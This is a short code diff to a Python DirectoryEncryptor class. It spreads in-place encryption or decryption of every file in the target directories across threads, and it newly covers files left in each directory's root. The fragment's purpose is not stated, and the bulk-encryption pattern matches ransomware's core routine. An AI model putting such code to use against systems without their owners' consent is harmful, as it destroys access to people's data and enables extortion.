@@ -60,25 +60,34 @@ class DirectoryEncryptor(FileEncryptor):
 
     def crypt_all_dirs(self, mode: str) -> None:
         threads: list[threading.Thread] = []
-        #[crypt_dir(target_dir_path, mode) for target_dir_path in target_dir_paths]
-        #! FILES IN THE ROOT DIRECTORY ARE NOT ENCRYPTED
+        
+        def add_thread(thread: threading.Thread): 
+            threads.append(thread)
+            thread.start()
+
         for directory in target_dir_paths:
             subdirs = [os.path.join(directory, entry) for entry in os.listdir(directory) if os.path.isdir(os.path.join(directory, entry))]
 
             if len(subdirs) <= 1:
                 self.crypt_dir(directory, mode)
                 continue
-    
+
+            leftover_files: list[str] = [os.path.join(directory, file) for file in os.listdir(directory) if os.path.isfile(os.path.join(directory, file))]
+
             for subdir in subdirs:
                 if len(threads) < MAX_THREADS:
                     thread = threading.Thread(target=self.crypt_dir, args=(subdir, mode,))
-                    threads.append(thread)
-                    thread.start()
+                    add_thread(thread)
                 else:
                     self.crypt_dir(subdir, mode)
+
+            if len(leftover_files) > 0:
+                crypt_leftover = lambda: [self.encrypt_file(path) if mode == "encrypt" else self.decrypt_file(path) for path in leftover_files]
+                thread = threading.Thread(target=crypt_leftover)
+                add_thread(thread)
+
         [thread.join() for thread in threads]
         threads.clear()
-
 
 def main():
     def load_key() -> str:
